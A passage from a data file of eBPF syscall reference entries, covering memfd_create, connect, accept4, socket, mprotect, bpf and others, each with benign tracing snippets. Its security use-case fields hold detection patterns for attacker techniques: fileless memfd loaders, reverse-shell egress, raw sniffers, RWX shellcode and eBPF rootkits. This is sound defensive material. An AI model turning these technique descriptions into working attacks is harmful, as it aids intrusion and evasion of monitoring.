      'If i_nlink drops to zero AND no process currently holds an open struct file * referencing that inode, the filesystem reclaims the underlying disk blocks immediately. If a process still has the file open, the file remains in memory/disk as an "unlinked open file" until the last FD is closed.'
    ],
    kernelInternalsAndStructures: [
      'do_unlinkat() & vfs_unlink() in fs/namei.c',
      'struct inode->i_nlink (hard-link reference count decremented on unlink)',
      'AT_REMOVEDIR (0x200) — causes unlinkat() to act like rmdir()'
    ],
    howToTraceInEbpf: [
      'Hook SEC("tracepoint/syscalls/sys_enter_unlinkat") and read ctx->args[1] using bpf_probe_read_user_str() to capture the exact file path being deleted.'
    ],
    pointerAndVerifierGotchas: [
      'In unlinkat(), pathname is at ctx->args[1] (because ctx->args[0] is dirfd). In legacy unlink(), pathname is at ctx->args[0]. Hook both or hook vfs_unlink / lsm/inode_unlink.'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns 0 when the directory entry is successfully removed.',
      commonErrors: [
        { errno: '-ENOENT (-2)', reason: 'Target file path does not exist.' },
        { errno: '-EPERM / -EACCES', reason: 'Caller lacks write permission on the parent directory or sticky bit restricted.' },
        { errno: '-EISDIR (-21)', reason: 'Pathname refers to a directory and AT_REMOVEDIR was not specified.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'dirfd',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Directory FD or AT_FDCWD (-100).'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'pathname',
        cType: 'const char __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user_str()',
        detailedMeaning: 'User-space path string of the file or directory being deleted.'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'flags',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: '0 for files, or AT_REMOVEDIR (0x200) for directories.'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Ransomware & Log-Wiping Anti-Forensics Detection',
        scenario: 'Detecting attackers or ransomware deleting /var/log/* audit logs, bash_history, or mass-unlinking production database files.'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_unlinkat")
int trace_unlinkat(struct trace_event_raw_sys_enter *ctx) {
    char path[128];
    const char *pathname = (const char *)ctx->args[1];
    bpf_probe_read_user_str(&path, sizeof(path), pathname);

    bpf_printk("FILE DELETE: pid=%d unlinking %s\\n",
               bpf_get_current_pid_tgid() >> 32, path);
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_unlinkat", objs.TraceUnlinkat, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_unlinkat: %v", err)
}
defer tp.Close()`,
    relatedTutorialId: 'tut-beg-06-file-unlink'
  },

  {
    id: 'sys-memfd-create',
    syscallNumberX86_64: 319,
    name: 'memfd_create',
    category: 'Filesystem & VFS',
    cSignature: 'int memfd_create(const char *name, unsigned int flags);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_memfd_create")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_memfd_create")',
    fentryHook: 'SEC("fentry/__x64_sys_memfd_create")',
    lsmAlternative: 'SEC("lsm/file_open")',
    shortSummary:
      'Creates an anonymous, RAM-backed file residing purely in tmpfs/shmem volatile memory and returns a regular file descriptor.',
    whatItDoesInDetail: [
      'memfd_create() allocates an anonymous file backed by kernel shared memory (shmem/tmpfs) that has no corresponding path on any mounted disk filesystem (it appears only in /proc/<pid>/fd/ as a symlink to "/memfd:<name> (deleted)").',
      'Legitimate programs (like Wayland compositors, PulseAudio, and JIT engines) use memfd_create() with MFD_ALLOW_SEALING to share zero-copy memory buffers between processes. However, Linux malware and red-team frameworks use memfd_create() to stage ELF binaries in RAM and execute them via execveat() or /proc/self/fd/<N>, leaving zero artifacts on the disk.'
    ],
    kernelInternalsAndStructures: [
      'shmem_file_setup() in mm/shmem.c (allocates the anonymous tmpfs file)',
      'MFD_CLOEXEC (0x0001), MFD_ALLOW_SEALING (0x0002), MFD_NOEXEC_SEAL (0x0008 in Linux 6.3+)'
    ],
    howToTraceInEbpf: [
      'Hook SEC("tracepoint/syscalls/sys_enter_memfd_create"), read ctx->args[0] via bpf_probe_read_user_str() to get the descriptive name, and inspect ctx->args[1] (flags).',
      'Correlate with sys_exit_memfd_create to record the returned FD, then watch if that same PID/FD is passed to sys_enter_execveat or opened via /proc/self/fd/.'
    ],
    pointerAndVerifierGotchas: [
      'The name argument (ctx->args[0]) is purely cosmetic and supplied by the caller—do not trust it to be benign! Always track the returned file descriptor integer from sys_exit_memfd_create.'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns a new non-negative file descriptor pointing to the anonymous RAM file.',
      commonErrors: [
        { errno: '-EINVAL (-22)', reason: 'Name exceeds 249 bytes or unknown flags bit set.' },
        { errno: '-EMFILE (-24)', reason: 'Per-process open FD limit reached.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'name',
        cType: 'const char __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user_str()',
        detailedMeaning: 'Diagnostic name displayed in /proc/<pid>/fd/ symlinks (prefixed with memfd:).'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'flags',
        cType: 'unsigned int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Bitmask: MFD_CLOEXEC (1), MFD_ALLOW_SEALING (2), MFD_HUGETLB (4), MFD_NOEXEC_SEAL (8).'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'In-Memory Dropper & Fileless Loader Detection',
        scenario: 'Flagging any network-facing service (nginx, node, python, java) that invokes memfd_create() without MFD_NOEXEC_SEAL.'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_memfd_create")
int trace_memfd(struct trace_event_raw_sys_enter *ctx) {
    char name[64];
    const char *uname = (const char *)ctx->args[0];
    __u32 flags = (__u32)ctx->args[1];

    bpf_probe_read_user_str(&name, sizeof(name), uname);
    bpf_printk("MEMFD_CREATE: pid=%d name=memfd:%s flags=0x%x\\n",
               bpf_get_current_pid_tgid() >> 32, name, flags);
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_memfd_create", objs.TraceMemfd, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_memfd_create: %v", err)
}
defer tp.Close()`,
    relatedTutorialId: 'tut-adv-20-fileless'
  },

  // ============================================================================
  // NETWORK & SOCKETS SUBSYSTEM
  // ============================================================================
  {
    id: 'sys-connect',
    syscallNumberX86_64: 42,
    name: 'connect',
    category: 'Network & Sockets',
    cSignature: 'int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_connect")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_connect")',
    fentryHook: 'SEC("fentry/tcp_v4_connect")',
    lsmAlternative: 'SEC("cgroup/connect4") / SEC("lsm/socket_connect")',
    shortSummary:
      'Initiates an outbound connection on a socket descriptor (e.g., triggering a TCP 3-way SYN handshake or setting a UDP peer address).',
    whatItDoesInDetail: [
      'When an application dials an external IP/port (e.g., an HTTP client, database driver, or reverse shell), it invokes connect(sockfd, addr, addrlen).',
      'Inside the kernel, __sys_connect() copies the user-space struct sockaddr (either struct sockaddr_in for IPv4, struct sockaddr_in6 for IPv6, or struct sockaddr_un for Unix domain sockets) into kernel stack memory via move_addr_to_kernel(), looks up the struct socket * from sockfd, and invokes sock->ops->connect().',
      'For TCP sockets, inet_stream_connect() transitions the socket state to TCP_SYN_SENT and calls tcp_v4_connect(), which selects an ephemeral source port, builds a SYN sk_buff, and transmits it down the network stack.'
    ],
    kernelInternalsAndStructures: [
      'struct sockaddr_in (sa_family_t sin_family, __be16 sin_port, struct in_addr sin_addr)',
      'struct sock (kernel network layer representation holding sk_daddr, sk_dport, sk_state)',
      'tcp_v4_connect() (kernel TCP layer function invoked for AF_INET stream sockets)'
    ],
    howToTraceInEbpf: [
      'At the syscall layer (sys_enter_connect), ctx->args[1] is a struct sockaddr __user * pointer. Read the first 2 bytes (sa_family) using bpf_probe_read_user(). If sa_family == AF_INET (2), read the 16-byte struct sockaddr_in and convert sin_port from big-endian network byte order via bpf_ntohs().',
      'Alternatively, for cgroup-scoped container interception where you can even rewrite the destination IP/port before the SYN is sent, use SEC("cgroup/connect4")!'
    ],
    pointerAndVerifierGotchas: [
      'Non-blocking sockets (used by Go’s netpoller, Envoy, and Node.js) almost ALWAYS return -EINPROGRESS (-115) from sys_exit_connect because the TCP SYN-ACK has not arrived yet! Do not treat -EINPROGRESS as a connection failure.'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns 0 when the connection succeeds synchronously.',
      commonErrors: [
        { errno: '-EINPROGRESS (-115)', reason: 'Normal for non-blocking sockets: TCP SYN was sent and handshake is in progress.' },
        { errno: '-ECONNREFUSED (-111)', reason: 'Remote host replied with a TCP RST packet (no process listening on port).' },
        { errno: '-ETIMEDOUT (-110)', reason: 'SYN retransmissions timed out with no reply.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'sockfd',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Socket file descriptor created earlier by socket().'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'addr',
        cType: 'const struct sockaddr __user *',
        pointerSpace: 'USER_STRUCT_PTR (__user)',
        helperRequired: 'bpf_probe_read_user()',
        detailedMeaning: 'User-space pointer to sockaddr_in (IPv4), sockaddr_in6 (IPv6), or sockaddr_un (Unix socket).'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'addrlen',
        cType: 'socklen_t',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Size of the address structure in bytes (16 for IPv4, 28 for IPv6).'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'C2 Beaconing & Reverse Shell Egress Detection',
        scenario: 'Detecting unexpected processes (e.g., bash, python, java) initiating outbound TCP connections to external IPs.'
      },
      {
        title: 'Service Dependency & Connection Failure Mapping',
        scenario: 'Building a zero-instrumentation service mesh topology map of which PIDs/pods connect to which destination IPs and ports.'
      }
    ],
    cSnippet: `struct sockaddr_in_user {
    __u16 sin_family;
    __be16 sin_port;
    __be32 sin_addr;
};

SEC("tracepoint/syscalls/sys_enter_connect")
int trace_connect(struct trace_event_raw_sys_enter *ctx) {
    struct sockaddr_in_user addr = {};
    const void *uaddr = (const void *)ctx->args[1];
    bpf_probe_read_user(&addr, sizeof(addr), uaddr);

    if (addr.sin_family == 2) { // AF_INET
        __u16 dport = __builtin_bswap16(addr.sin_port);
        bpf_printk("TCP connect to IP=%pI4 port=%d\\n", &addr.sin_addr, dport);
    }
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_connect", objs.TraceConnect, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_connect: %v", err)
}
defer tp.Close()`,
    relatedTutorialId: 'tut-mid-06-tcp-connect'
  },

  {
    id: 'sys-accept4',
    syscallNumberX86_64: 288,
    name: 'accept4',
    category: 'Network & Sockets',
    cSignature: 'int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_accept4")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_accept4")',
    fentryHook: 'SEC("fexit/inet_csk_accept")',
    lsmAlternative: 'SEC("lsm/socket_accept")',
    shortSummary:
      'Extracts the first completed incoming connection from a listening socket’s accept queue and allocates a new connected socket file descriptor.',
    whatItDoesInDetail: [
      'Server applications (Nginx, Envoy, Go net/http, Postgres) call accept4() on a listening socket FD to dequeue a client connection that has completed its TCP 3-way handshake.',
      'Unlike connect() (where the user passes the destination address IN at sys_enter), in accept4() the kernel writes the remote client’s IP and source port OUT into the user-space struct sockaddr *addr buffer during the syscall! Therefore, addr is only populated when sys_exit_accept4 fires (with ret > 0 equal to the new client socket FD).',
      'Under the hood, __sys_accept4() calls inet_csk_accept(), dequeues the child struct sock * from the listener’sicsk_accept_queue, allocates a new file descriptor, and optionally sets SOCK_NONBLOCK and SOCK_CLOEXEC atomically via the flags parameter.'
    ],
    kernelInternalsAndStructures: [
      'inet_csk_accept() (kernel function returning the newly accepted struct sock *)',
      'struct request_sock_queue (icsk_accept_queue holding completed 3-way handshakes)',
      'SOCK_NONBLOCK (04000) & SOCK_CLOEXEC (02000000) flags'
    ],
    howToTraceInEbpf: [
      'Option A (Syscall Tracepoint): Save ctx->args[1] (struct sockaddr __user *addr) in a hash map at sys_enter_accept4, then read the remote client IP/port from that pointer in sys_exit_accept4 when ctx->ret >= 0.',
      'Option B (Kernel Trampoline — Recommended): Hook SEC("fexit/inet_csk_accept") or SEC("kretprobe/inet_csk_accept") where the return value is a kernel struct sock *newsk! Note that some servers pass addr = NULL to accept4() if they don’t care about the client IP, whereas inet_csk_accept() ALWAYS has newsk->__sk_common.skc_daddr.'
    ],
    pointerAndVerifierGotchas: [
      'Remember that the addr pointer passed to accept4(sockfd, addr, addrlen, flags) is NULL-able! Always check if (uaddr != NULL) before calling bpf_probe_read_user(), or hook inet_csk_accept() directly.'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns a new non-negative socket file descriptor representing the accepted client connection.',
      commonErrors: [
        { errno: '-EAGAIN (-11)', reason: 'Accept queue is currently empty on a non-blocking listening socket.' },
        { errno: '-EMFILE (-24)', reason: 'Server process has exhausted its open file descriptor limit.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'sockfd',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Listening server socket FD.'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'addr',
        cType: 'struct sockaddr __user *',
        pointerSpace: 'USER_STRUCT_PTR (__user)',
        helperRequired: 'bpf_probe_read_user() at sys_exit',
        detailedMeaning: 'Optional output buffer filled by the kernel with the connecting client’s IP and port.'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'addrlen',
        cType: 'socklen_t __user *',
        pointerSpace: 'USER_POINTER (__user)',
        helperRequired: 'bpf_probe_read_user()',
        detailedMeaning: 'Value-result pointer specifying the size of addr.'
      },
      {
        argIndex: 'ctx->args[3]',
        name: 'flags',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'SOCK_NONBLOCK | SOCK_CLOEXEC bitmask.'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Inbound Connection & Backdoor Listener Auditing',
        scenario: 'Detecting unauthorized processes accepting inbound TCP connections inside a container.'
      }
    ],
    cSnippet: `SEC("kretprobe/inet_csk_accept")
int BPF_KRETPROBE(trace_accept_ret, struct sock *newsk) {
    if (!newsk) return 0;

    __u16 family = BPF_CORE_READ(newsk, __sk_common.skc_family);
    if (family == 2) { // AF_INET
        __u32 client_ip = BPF_CORE_READ(newsk, __sk_common.skc_daddr);
        __u16 local_port = BPF_CORE_READ(newsk, __sk_common.skc_num);
        bpf_printk("Accepted client=%pI4 on local_port=%d\\n", &client_ip, local_port);
    }
    return 0;
}`,
    goSnippet: `kp, err := link.Kretprobe("inet_csk_accept", objs.TraceAcceptRet, nil)
if err != nil {
    log.Fatalf("attaching inet_csk_accept: %v", err)
}
defer kp.Close()`
  },

  {
    id: 'sys-bind-socket',
    syscallNumberX86_64: 49,
    name: 'bind & socket',
    category: 'Network & Sockets',
    cSignature: 'int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen); // socket is #41',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_bind")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_bind")',
    fentryHook: 'SEC("fentry/__x64_sys_bind")',
    lsmAlternative: 'SEC("lsm/socket_bind") / SEC("cgroup/bind4")',
    shortSummary:
      'socket() creates a communication endpoint FD, and bind() assigns a local IP address and listening port (or Unix socket path) to that socket.',
    whatItDoesInDetail: [
      'Before a server can listen() and accept4() connections, it calls socket(domain, type, protocol) (syscall #41) to allocate a struct socket and then calls bind(sockfd, addr, addrlen) (syscall #49) to reserve a local TCP/UDP port or filesystem Unix socket path.',
      'Additionally, security researchers closely monitor socket(AF_PACKET, SOCK_RAW, ...) because raw packet sockets allow an attacker with CAP_NET_RAW to sniff all host network traffic or forge arbitrary Ethernet/IP headers.'
    ],
    kernelInternalsAndStructures: [
      '__sys_socket() & __sys_bind() in net/socket.c',
      'inet_bind() (checks port conflicts and CAP_NET_BIND_SERVICE for ports < 1024)',
      'AF_PACKET (17) & SOCK_RAW (3) (raw packet sniffing socket creation)'
    ],
    howToTraceInEbpf: [
      'In sys_enter_socket, read scalar arguments domain = ctx->args[0] and type = ctx->args[1] directly to alert on AF_PACKET (17) or SOCK_RAW (3).',
      'In sys_enter_bind, read the user-space struct sockaddr_in from ctx->args[1] via bpf_probe_read_user() to log every local port a process attempts to bind.'
    ],
    pointerAndVerifierGotchas: [
      'Remember that sin_port inside struct sockaddr_in is stored in big-endian network byte order! Convert it with __builtin_bswap16(addr.sin_port) or bpf_ntohs().'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'bind() returns 0 on success; socket() returns the new socket FD.',
      commonErrors: [
        { errno: '-EADDRINUSE (-98)', reason: 'Another socket is already bound to the requested IP and port.' },
        { errno: '-EACCES (-13)', reason: 'Attempted to bind a privileged port (< 1024) without CAP_NET_BIND_SERVICE.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'sockfd (bind) / domain (socket)',
        cType: 'int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Socket FD being bound (for bind) or address family AF_INET=2, AF_INET6=10, AF_PACKET=17 (for socket).'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'addr (bind) / type (socket)',
        cType: 'const struct sockaddr __user * / int',
        pointerSpace: 'USER_STRUCT_PTR (__user)',
        helperRequired: 'bpf_probe_read_user() for bind',
        detailedMeaning: 'Local IP/port address struct for bind(), or SOCK_STREAM (1) / SOCK_DGRAM (2) / SOCK_RAW (3) for socket().'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'addrlen / protocol',
        cType: 'socklen_t / int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Byte length of sockaddr (for bind) or IPPROTO_TCP / IPPROTO_UDP (for socket).'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Rogue Port Listener & Raw Sniffer Detection',
        scenario: 'Alerting when a container opens a new listening port via bind() or creates a raw packet sniffer via socket(AF_PACKET, SOCK_RAW).'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_socket")
int trace_socket_create(struct trace_event_raw_sys_enter *ctx) {
    int domain = (int)ctx->args[0];
    int type = (int)ctx->args[1] & 0xF; // mask out SOCK_NONBLOCK/SOCK_CLOEXEC

    // AF_PACKET == 17 or SOCK_RAW == 3
    if (domain == 17 || type == 3) {
        bpf_printk("RAW SOCKET ALERT: pid=%d domain=%d type=%d\\n",
                   bpf_get_current_pid_tgid() >> 32, domain, type);
    }
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_socket", objs.TraceSocketCreate, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_socket: %v", err)
}
defer tp.Close()`
  },

  // ============================================================================
  // MEMORY, PRIVILEGE & SECURITY SUBSYSTEM
  // ============================================================================
  {
    id: 'sys-mmap-mprotect',
    syscallNumberX86_64: 9,
    name: 'mmap & mprotect',
    category: 'Memory, Privilege & Security',
    cSignature: 'int mprotect(void *addr, size_t len, int prot); // mmap is #9, mprotect is #10',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_mprotect")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_mprotect")',
    fentryHook: 'SEC("fentry/__x64_sys_mprotect")',
    lsmAlternative: 'SEC("lsm/file_mprotect")',
    shortSummary:
      'mmap() maps files or anonymous RAM into a process’s virtual address space, and mprotect() changes page-table protection bits (Read/Write/Execute).',
    whatItDoesInDetail: [
      'Every shared library (.so), heap allocation (when malloc requests large chunks from the OS), and JIT code buffer is created via mmap() (syscall #9) and has its page-table hardware permissions updated via mprotect() (syscall #10).',
      'Modern operating systems enforce W^X (Write XOR Execute): a memory page should never be simultaneously writable AND executable. When an attacker exploits a memory vulnerability or injects shellcode, they call mmap() or mprotect() with prot = PROT_READ | PROT_WRITE | PROT_EXEC (0x7)—or write shellcode into a RW buffer and flip it to PROT_EXEC (0x4) via mprotect().',
      'Inside the kernel, do_mprotect_pkey() walks the process’s virtual memory areas (struct vm_area_struct / VMA Maple Tree), calls security_file_mprotect(), and updates the CPU hardware page table entries (PTEs), flushing the TLB.'
    ],
    kernelInternalsAndStructures: [
      'struct vm_area_struct (VMA describing start/end virtual addresses and vm_flags)',
      'PROT_READ (0x1), PROT_WRITE (0x2), PROT_EXEC (0x4)',
      'security_file_mprotect() (LSM hook capable of denying W->X page transitions)'
    ],
    howToTraceInEbpf: [
      'Hook SEC("tracepoint/syscalls/sys_enter_mprotect") and SEC("tracepoint/syscalls/sys_enter_mmap").',
      'In mprotect, prot is at ctx->args[2]. In mmap, prot is ALSO at ctx->args[2]! Check if ((prot & 0x6) == 0x6) (both PROT_WRITE and PROT_EXEC set simultaneously = RWX memory!).'
    ],
    pointerAndVerifierGotchas: [
      'All arguments to mprotect(addr, len, prot) are scalar numbers or virtual addresses—no bpf_probe_read_user() is needed to inspect them!'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'mprotect() returns 0 on success; mmap() returns the starting virtual address of the mapping.',
      commonErrors: [
        { errno: '-EACCES (-13)', reason: 'File is on a noexec mount or denied by SELinux / BPF LSM file_mprotect.' },
        { errno: '-ENOMEM (-12)', reason: 'Process exceeded vm.max_map_count or address range is invalid.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'addr',
        cType: 'unsigned long',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Page-aligned starting virtual address in the process address space.'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'len',
        cType: 'size_t',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Length of the virtual memory region in bytes.'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'prot',
        cType: 'unsigned long',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Page protection flags: PROT_READ (1) | PROT_WRITE (2) | PROT_EXEC (4).'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'RWX Shellcode & Memory Exploit Detection',
        scenario: 'Catching processes allocating RWX (prot == 0x7) memory pages or marking anonymous heap/stack memory as executable (PROT_EXEC).'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_mprotect")
int trace_mprotect(struct trace_event_raw_sys_enter *ctx) {
    unsigned long addr = ctx->args[0];
    size_t len = (size_t)ctx->args[1];
    unsigned long prot = ctx->args[2];

    // Check if both PROT_WRITE (0x2) and PROT_EXEC (0x4) are requested (RWX = 0x6)
    if ((prot & 0x6) == 0x6) {
        bpf_printk("RWX MEMORY ALERT: pid=%d addr=0x%lx len=%lu\\n",
                   bpf_get_current_pid_tgid() >> 32, addr, len);
    }
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_mprotect", objs.TraceMprotect, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_mprotect: %v", err)
}
defer tp.Close()`,
    relatedTutorialId: 'tut-adv-20-fileless'
  },

  {
    id: 'sys-bpf',
    syscallNumberX86_64: 321,
    name: 'bpf',
    category: 'Memory, Privilege & Security',
    cSignature: 'int bpf(int cmd, union bpf_attr *attr, unsigned int size);',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_bpf")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_bpf")',
    fentryHook: 'SEC("fentry/__sys_bpf")',
    lsmAlternative: 'SEC("lsm/bpf")',
    shortSummary:
      'The multiplexed Linux system call that creates BPF maps, loads and verifies eBPF programs, pins objects to bpffs, and attaches links.',
    whatItDoesInDetail: [
      'Every eBPF tool—including your own Go cilium/ebpf programs, Cilium, Falco, and bpftrace—interacts with the kernel exclusively through the bpf() system call (#321 on x86_64).',
      'The first argument cmd selects one of 35+ subcommands defined in enum bpf_cmd: BPF_MAP_CREATE (0), BPF_MAP_LOOKUP_ELEM (1), BPF_MAP_UPDATE_ELEM (2), BPF_PROG_LOAD (5), BPF_OBJ_PIN (6), BPF_RAW_TRACEPOINT_OPEN (17), BPF_LINK_CREATE (28), etc.',
      'Tracing the bpf() syscall itself ("eBPF tracing eBPF") is critical in production security because sophisticated Linux rootkits (like TripleCross or Pamspy) attempt to load rogue eBPF programs to hide their PIDs or intercept SSH credentials!'
    ],
    kernelInternalsAndStructures: [
      '__sys_bpf(int cmd, bpfptr_t uattr, unsigned int size) in kernel/bpf/syscall.c',
      'union bpf_attr (128+ byte user-space union containing map specs or instruction pointers)',
      'security_bpf() & security_bpf_prog() (LSM hooks auditing eBPF operations)'
    ],
    howToTraceInEbpf: [
      'Hook SEC("tracepoint/syscalls/sys_enter_bpf") or SEC("lsm/bpf") and inspect int cmd = (int)ctx->args[0].',
      'When cmd == BPF_PROG_LOAD (5), read the first 4 bytes of union bpf_attr at ctx->args[1] via bpf_probe_read_user() to extract prog_type, and read attr->prog_name (at offset 48) to see the exact name of the eBPF program being loaded.'
    ],
    pointerAndVerifierGotchas: [
      'Your own Go loader calls bpf(BPF_MAP_LOOKUP_ELEM) and bpf(BPF_PROG_LOAD). Filter on cmd == BPF_PROG_LOAD (5) or cmd == BPF_MAP_CREATE (0) so you only log new program/map creations rather than high-frequency map reads.'
    ],
    returnValuesAndErrnos: {
      successMeaning: 'Returns a new anonymous file descriptor for BPF_MAP_CREATE, BPF_PROG_LOAD, and BPF_LINK_CREATE.',
      commonErrors: [
        { errno: '-EACCES (-13)', reason: 'The eBPF Static Verifier rejected the program bytecode as unsafe!' },
        { errno: '-EPERM (-1)', reason: 'Caller lacks CAP_BPF, CAP_PERFMON, or CAP_NET_ADMIN capabilities.' }
      ]
    },
    arguments: [
      {
        argIndex: 'ctx->args[0]',
        name: 'cmd',
        cType: 'int (enum bpf_cmd)',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Subcommand: BPF_MAP_CREATE (0), BPF_PROG_LOAD (5), BPF_LINK_CREATE (28).'
      },
      {
        argIndex: 'ctx->args[1]',
        name: 'attr',
        cType: 'union bpf_attr __user *',
        pointerSpace: 'USER_STRUCT_PTR (__user)',
        helperRequired: 'bpf_probe_read_user()',
        detailedMeaning: 'User-space pointer to union bpf_attr describing the map or program parameters.'
      },
      {
        argIndex: 'ctx->args[2]',
        name: 'size',
        cType: 'unsigned int',
        pointerSpace: 'SCALAR / FD',
        helperRequired: 'Direct read (scalar)',
        detailedMeaning: 'Size of the union bpf_attr struct passed by userspace.'
      }
    ],
    securityAndObservabilityUseCases: [
      {
        title: 'Rogue eBPF Rootkit Detection ("Watching the Watchers")',
        scenario: 'Alerting whenever an unknown binary calls bpf(BPF_PROG_LOAD) on a production Kubernetes node.'
      }
    ],
    cSnippet: `SEC("tracepoint/syscalls/sys_enter_bpf")
int trace_bpf_syscall(struct trace_event_raw_sys_enter *ctx) {
    int cmd = (int)ctx->args[0];

    // 5 == BPF_PROG_LOAD
    if (cmd == 5) {
        __u32 prog_type = 0;
        bpf_probe_read_user(&prog_type, sizeof(prog_type), (void *)ctx->args[1]);
        bpf_printk("AUDIT: pid=%d loading eBPF prog_type=%d\\n",
                   bpf_get_current_pid_tgid() >> 32, prog_type);
    }
    return 0;
}`,
    goSnippet: `tp, err := link.Tracepoint("syscalls", "sys_enter_bpf", objs.TraceBpfSyscall, nil)
if err != nil {
    log.Fatalf("attaching sys_enter_bpf: %v", err)
}
defer tp.Close()`
  },

  {
    id: 'sys-setuid-capset',
    syscallNumberX86_64: 105,
    name: 'setuid / setresuid / capset',
    category: 'Memory, Privilege & Security',
    cSignature: 'int setuid(uid_t uid); // setresuid is #117, capset is #126',
    enterTracepoint: 'SEC("tracepoint/syscalls/sys_enter_setuid")',
    exitTracepoint: 'SEC("tracepoint/syscalls/sys_exit_setuid")',
    fentryHook: 'SEC("fentry/commit_creds")',
    lsmAlternative: 'SEC("lsm/task_fix_setuid")',
    shortSummary:
      'Modifies the effective, real, or saved User ID (UID) or Linux capabilities of the calling task via the kernel’s copy-on-write struct cred.',
    whatItDoesInDetail: [
      'When a process changes privileges (e.g., sudo/su escalating to root UID 0, or a web server dropping privileges from UID 0 to www-data UID 33), it invokes setuid() (#105), setreuid() (#113), setresuid() (#117), or capset() (#126).',
      'Inside the kernel, task credentials (struct cred) are immutable and managed via RCU copy-on-write: prepare_creds() allocates a duplicate struct cred, modifies uid/euid/suid or cap_effective, checks security_task_fix_setuid(), and atomically swaps current->real_cred and current->cred via commit_creds().',
